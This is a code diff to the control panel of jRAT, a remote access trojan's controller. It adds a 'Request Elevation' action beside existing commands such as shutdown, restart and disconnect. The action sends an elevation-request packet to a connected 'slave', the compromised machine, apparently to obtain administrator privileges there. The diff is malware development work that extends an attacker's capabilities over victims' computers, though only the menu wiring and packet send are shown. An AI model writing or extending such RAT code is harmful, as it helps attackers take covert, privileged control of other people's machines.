@@ -41,6 +41,7 @@ import su.jrat.client.addons.PluginLoader;
 import su.jrat.client.addons.RATObjectFormat;
 import su.jrat.client.exceptions.ControlPanelLoadException;
 import su.jrat.client.listeners.Performable;
+import su.jrat.client.packets.outgoing.Packet100RequestElevation;
 import su.jrat.client.packets.outgoing.Packet11Disconnect;
 import su.jrat.client.packets.outgoing.Packet28ShutdownComputer;
 import su.jrat.client.packets.outgoing.Packet29RestartComputer;
@@ -336,6 +337,7 @@ public class FrameControlPanel extends BaseFrame {
 				r.icons.put("view installed plugins", IconUtils.getIcon("plugin_go"));
 				r.icons.put("notes", IconUtils.getIcon("sticky-notes-pin"));
 				r.icons.put("locales", FlagUtils.getFlag(slave));
+				r.icons.put("request elevation", IconUtils.getIcon("shield"));
 
 				ImageIcon plugin = IconUtils.getIcon("plugin");
 
@@ -521,6 +523,7 @@ public class FrameControlPanel extends BaseFrame {
 
 		DefaultMutableTreeNode slave = new DefaultMutableTreeNode("Connection Actions");
 		n.add(slave);
+		slave.add(new DefaultMutableTreeNode("Request Elevation"));
 		slave.add(new DefaultMutableTreeNode("Restart connection"));
 		slave.add(new DefaultMutableTreeNode("Reconnect"));
 		slave.add(new DefaultMutableTreeNode("Disconnect"));
@@ -731,6 +734,11 @@ public class FrameControlPanel extends BaseFrame {
 			}
 		});
 
+		actions.put("request elevation", new Performable() {
+			public void perform() {
+				slave.addToSendQueue(new Packet100RequestElevation());
+			}
+		});
 	}
 
 	public void expandAll(JTree tree) {
